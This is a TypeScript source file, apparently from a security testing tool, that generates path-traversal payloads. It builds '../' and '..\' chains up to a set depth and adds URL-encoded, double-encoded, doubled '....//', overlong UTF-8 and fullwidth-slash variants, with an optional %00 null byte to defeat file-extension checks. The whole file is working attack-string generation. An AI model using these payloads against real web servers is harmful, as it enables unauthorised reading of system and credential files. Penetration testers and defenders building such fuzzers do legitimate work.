function generateAllLevelParams(maxLevel: number, isLinux: boolean) {
  const list = []
  for (let i = 1; i <= maxLevel; i++) {
    let tmpStr = ''
    for (let j = 1; j <= i; j++) {
      tmpStr = (isLinux ? '../' : '..\\') + tmpStr
    }
    list.push(tmpStr)
  }
  return list
}

export const generateDirectoryTraversalKeys = ({
  fileName,
  maxLevel,
  extName,
  skipExtensionCheck,
  isLinux,
  encodeURI,
  doubleEncodeURI,
  doubleWrite,
  nonStandardEncode1,
  nonStandardEncode2,
  nonStandardEncode3
}: {
  fileName: string
  maxLevel: number
  extName?: string
  skipExtensionCheck: boolean
  encodeURI: boolean
  doubleEncodeURI: boolean
  doubleWrite: boolean
  isLinux: boolean
  nonStandardEncode1: boolean
  nonStandardEncode2: boolean
  nonStandardEncode3: boolean
}) => {
  const allLevelKeys = generateAllLevelParams(maxLevel, isLinux)
  const list: string[] = [...allLevelKeys]

  if (encodeURI) {
    list.push(...allLevelKeys.map(key => encodeURIComponent(key).replace(/\./g, '%2E')))
  }
  if (doubleEncodeURI) {
    list.push(
      ...allLevelKeys.map(key => encodeURIComponent(encodeURIComponent(key).replace(/\./g, '%2E')))
    )
  }
  if (doubleWrite) {
    if (isLinux) {
      list.push(...allLevelKeys.map(key => key.replace(/\.\.\//g, '....//')))
    } else {
      list.push(...allLevelKeys.map(key => key.replace(/\.\.\\/g, '....\\\\')))
    }
  }
  if (nonStandardEncode1) {
    if (isLinux) {
      list.push(...allLevelKeys.map(key => key.replace(/\//g, '%c0%af')))
    } else {
      list.push(...allLevelKeys.map(key => key.replace(/\\/g, '%c1%9c')))
    }
  }
  if (nonStandardEncode2) {
    if (isLinux) {
      list.push(...allLevelKeys.map(key => key.replace(/\//g, '%ef%bc%8f')))
    } else {
      list.push(...allLevelKeys.map(key => key.replace(/\\/g, '%ef%bc%bc')))
    }
  }
  if (nonStandardEncode3) {
    list.push(...allLevelKeys.map(key => key.replace(/\./g, '%c0%ae')))
  }

  return [
    ...new Set(
      list.map(
        item =>
          `${item}${fileName}${extName ? `${skipExtensionCheck ? '%00' : ''}.${extName}` : ''}`
      )
    )
  ]
}
